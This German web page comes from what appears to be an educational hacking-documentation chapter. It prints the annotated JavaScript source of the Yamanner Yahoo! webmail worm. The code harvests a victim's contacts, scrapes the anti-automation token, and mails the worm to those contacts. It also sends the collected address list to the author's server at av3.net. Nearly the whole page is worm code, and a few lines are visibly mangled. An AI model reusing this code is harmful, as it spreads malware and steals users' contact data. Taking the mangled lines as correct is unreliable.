<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>You&#8217;ve been hacked! - Der Sourcecode des  Yahoo!-Webmail-Wurms Yamanner</title></head><body><h1>You&#8217;ve been hacked! - Der Sourcecode des  Yahoo!-Webmail-Wurms Yamanner</h1><p>Der Code des Wurms wurde u.a. <a href="http://groovin.net/stuff/yammer.txt">auf groovin.net</a>ver&ouml;ffentlicht, dort ist auch das <code>&lt;img&gt;</code>-Tagenthalten, &uuml;ber das der Code eingeschleust wurde. Hier folgt nur dereigentliche Wurmcode, den ich formatiert und kommentiert habe.</p><pre><code>var http_request = false;var Email = '';var IDList = '';var CRumb = '';<font color="#0000FF">// Hilfsfunktion zum Erzeugen und Senden von XMLHttpRequests </font>function makeRequest(url, Func, Method, Param) {  if (window.XMLHttpRequest) {    http_request = new XMLHttpRequest();  }  else if (window.ActiveXObject) {    http_request = new ActiveXObject('Microsoft.XMLHTTP');  }  http_request.target=""onreadystatechange = Func;  http_request.open(Method, url, true);  if( Method == 'GET')     http_request.send(null);  else    http_request.send(Param);}<font color="#0000FF">// nutzloser Versuch, eine Webseite zu &ouml;ffnen // (Schreibfehler in der URL) </font>window.open('http://www,lastdata.com');<font color="#0000FF">// Ermitteln des aktuell genutzten Servers, damit die// XMLHttpRequests sp&auml;ter an den richtigen Server geschickt// werden </font>ServerUrl = url0;USIndex = ServerUrl.indexOf('us.', 0);MailIndex = ServerUrl.indexOf('.mail', 0);CutLen = MailIndex - USIndex - 3;var Server = ServerUrl.substr(USIndex + 3, CutLen);<font color="#0000FF">// Diese Funktion sammelt die E-Mail-Adressen, an die der Wurm sp&auml;ter// geschickt werden soll </font>function GetIDs(HtmlContent) {  IDList = '';  StartString = ' &lt;td&gt;';  EndString = '&lt;/td&gt;';  i = 0;  StartIndex = HtmlContent.indexOf(StartString, 0);  while(StartIndex &gt;= 0) {     EndIndex = HtmlContent.indexOf(EndString, StartIndex);    CutLen = EndIndex - StartIndex - StartString.length;    YahooID = HtmlContent.substr(StartIndex + StartString.length, CutLen);  if( YahooID.indexOf('@yahoo.com', 0) &gt; 0 &#166;&#166; YahooID.indexOf('@yahoogroups.com', 0) &gt; 0 )    <font color="#0000FF">// Nur Adressen, die auf '@yahoo.com' oder '@yahoogroups.com' enden.    // sind von Interesse </font>    IDList = IDList + ',' + YahooID ;    StartString = '&lt;/tr&gt;';    StartIndex = HtmlContent.indexOf(StartString, StartIndex + 20);    StartString = ' &lt;td&gt;';    StartIndex = HtmlContent.indexOf(StartString, StartIndex + 20);    i++;  }  if(IDList.substr(0,1) == ',')    IDList = IDList.substr(1, IDList.length);  if(IDList.indexOf(',', 0) &gt;0) {     IDListArray = IDList.split(',');    Email = IDListArray[0];    IDList = IDList.replace(Email + ',', '');  }    <font color="#0000FF">// Die E-Mail-Adresse des aktuellen und des vorherigen Opfers   // werden aus der Liste gel&ouml;scht, damit der Wurm sich nicht  // erneut an diese beiden Opfer sendet </font>  CurEmail = spamform.NE.value;  IDList = IDList.replace(CurEmail + ',', '');  IDList = IDList.replace(',' + CurEmail, '');  IDList = IDList.replace(CurEmail,'');  UserEmail = showLetter.FromAddress.value;  IDList = IDList.replace(',' + UserEmail, '');  IDList = IDList.replace(UserEmail + ',', '');  IDList = IDList.replace(UserEmail, '');  return IDList;}<font color="#0000FF">// Diese Funktion sammelt die Mailadressen und startet dann// das Erzeugen der zu versendenden Wurm-Mail </font>function ListContacts() {  if (http_request.readyState == 4) {    if (http_request.status == 200) {      HtmlContent = http_request.responseText;      IDList = GetIDs(HtmlContent);      makeRequest('http://us.' + Server + '.mail.yahoo.com/ym/Compose/?rnd=' + Math.random(), Getcrumb, 'GET', null);    }  }}<font color="#0000FF">// Diese Funktion ermittelt den 'crumb' genannten, zuf&auml;lligen// Hash-Wert, mit dem Yahoo! ein automatisches Versenden von// E-Mails verhindert </font>function ExtractStr(HtmlContent) {   <font color="#0000FF">// Da " ben&ouml;tigt, aber nicht verwendet werden k&ouml;nnen, werden  // sie in Unicode kodiert  // Samy verwendete f&uuml;r diesen Zweck eine Variable und die  // Funktion String.fromCharCode() </font>  StartString = 'name=\u0022.crumb\u0022value=\u0022';  EndString = '\u0022';  i = 0;  StartIndex = HtmlContent.indexOf(StartString, 0);  EndIndex = HtmlContent.indexOf(EndString, StartIndex + StartString.length);  CutLen = EndIndex - StartIndex - StartString.length;  crumb = HtmlContent.substr(StartIndex + StartString.length, CutLen);  return crumb;}<font color="#0000FF">// Diese Funktion erzeugt die Mail, mit der der Wurm weiter// verbreitet wird </font>function Getcrumb() {   if (http_request.readyState == 4) {     if (http_request.status == 200) {       HtmlContent = http_request.responseText;      CRumb = ExtractStr(HtmlContent);      MyBody = 'this is test';      MySubj = 'New Graphic Site';      Url = 'http://us.' + Server + '.mail.yahoo.com/ym/Compose';      var ComposeAction = compose.action;      MidIndex = ComposeAction.indexOf('&amp;Mid=', 0);      incIndex = ComposeAction.indexOf('&amp;inc', 0);      CutLen = incIndex - MidIndex - 5;      var MyMid = ComposeAction.substr(MidIndex + 5, CutLen);      QIndex = ComposeAction.indexOf('?box=', 0);      AIndex = ComposeAction.indexOf('&amp;Mid', 0);      CutLen = AIndex - QIndex - 5;      var BoxName = ComposeAction.substr(QIndex + 5, CutLen);      Param = 'SEND=1&amp;SD=&amp;SC=&amp;CAN=&amp;docCharset=windows-1256&amp;PhotoMailUser=          &amp;PhotoToolInstall=&amp;OpenInsertPhoto=&amp;PhotoGetStart=0&amp;SaveCopy=no          &amp;PhotoMailInstallOrigin=&amp;.crumb=RUMBVAL&amp;Mid=EMAILMID&amp;inc=&amp;AttFol=          &amp;box=BOXNAME&amp;FwdFile=YM_FM&amp;FwdMsg=EMAILMID&amp;FwdSubj=EMAILSUBJ          &amp;FwdInline=&amp;OriginalFrom=FROMEMAIL&amp;OriginalSubject=EMAILSUBJ          &amp;InReplyTo=&amp;NumAtt=0&amp;AttData=&amp;UplData=&amp;OldAttData=&amp;OldUplData=          &amp;FName=&amp;ATT=&amp;VID=&amp;Markers=&amp;NextMarker=0&amp;Thumbnails=&amp;PhotoMailWith=          &amp;BrowseState=&amp;PhotoIcon=&amp;ToolbarState=&amp;VirusReport=&amp;Attachments=          &amp;Background=&amp;BGRef=&amp;BGDesc=&amp;BGDef=&amp;BGFg=&amp;BGFF=&amp;BGFS=&amp;BGSolid=          &amp;BGCustom=&amp;PlainMsg=%3Cbr%3E%3Cbr%3ENote%3A+forwarded+message+attached.          &amp;PhotoFrame=&amp;PhotoPrintAtHomeLink=&amp;PhotoSlideShowLink=&amp;PhotoPrintLink=          &amp;PhotoSaveLink=&amp;PhotoPermCap=&amp;PhotoPermPath=&amp;PhotoDownloadUrl=          &amp;PhotoSaveUrl=&amp;PhotoFlags=&amp;start=compose&amp;bmdomain=&amp;showcc=&amp;showbcc=          &amp;AC_Done=&amp;AC_ToList=0%2C&amp;AC_CcList=&amp;AC_BccList=&amp;sendtop=Send          &amp;savedrafttop=Save+as+a+Draft&amp;canceltop=Cancel&amp;FromAddr=          &amp;To=TOEMAIL              <font color="#0000FF">// Die erste gefundene Adresse </font>          &amp;Cc=          &amp;Bcc=BCCLIST             <font color="#0000FF">// Die weiteren gefundenen Adressen </font>          &amp;Subj=EMAILSUBJ&amp;Body=%3CBR%3E%3CBR%3ENote%3A+forwarded+message+attached.          &amp;Format=html&amp;sendbottom=Send&amp;savedraftbottom=Save+as+a+Draft          &amp;cancelbottom=Cancel&amp;cancelbottom=Cancel';      Param = Param.replace('BOXNAME', BoxName);      Param = Param.replace('RUMBVAL', CRumb);      Param = Param.replace('BCCLIST', IDList);        <font color="#0000FF">// IDList enth&auml;lt die gesammelten Adressen </font>      Param = Param.replace('TOEMAIL', Email);      Param = Param.replace('FROMEMAIL', 'av3@yahoo.com');      Param = Param.replace('EMAILBODY', MyBody);      Param = Param.replace('PlainMESSAGE', '');      Param = Param.replace('EMAILSUBJ', MySubj);      Param = Param.replace('EMAILSUBJ', MySubj);      Param = Param.replace('EMAILSUBJ', MySubj);        <font color="#0000FF">// replace() ersetzt immer nur das erste Vorkommen,        // so dass die Funktion hier mehrmals aufgerufen        // werden musste, um alle Vorkommen zu ersetzen </font>      Param = Param.replace('EMAILMID', MyMid);      Param = Param.replace('EMAILMID', MyMid);      makeRequest(Url, alertContents, 'POST', Param);    }  }}<font color="#0000FF">// Diese Funktion sendet die gesammelten Daten an den Server des// Wurm-Autors </font>function alertContents() {  if (http_request.readyState == 4) {    window.navigate('http://www.av3.net/?ShowFolder&amp;rb=Sent&amp;reset=1        &amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox        &amp;ShowFolder?rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date        &amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;ShowFolder?rb=Sent&amp;reset=1&amp;YY=75867        &amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;BCCList='        + IDList)  }}<font color="#0000FF">// Mit diesem Request wird der ganze Wurmcode gestartet: Mit Hilfe der// "QuickBuilder"-Funktion von Yahoo! werden die Adressen angefordert </font>makeRequest('http://us.' + Server + '.mail.yahoo.com/ym/QuickBuilder?build=Continue    &amp;cancel=&amp;continuetop=Continue&amp;canceltop=Cancel&amp;Inbox=Inbox&amp;Sent=Sent&amp;pfolder=all    &amp;freqCheck=&amp;freq=1&amp;numdays=on&amp;date=180&amp;ps=1&amp;numadr=100&amp;continuebottom=Continue    &amp;cancelbottom=Cancel&amp;rnd=' + Math.random(), ListContacts, 'GET', null)</code></pre><hr><p>Zur&uuml;ck<a href="yamanner.html">zur Wurm-Beschreibung</a>oder<a href="../kapitel5.html">zur Kapitel-Startseite</a>oder<a href="../../hacking-index.html">zur Doku-Startseite</a></p></body></html>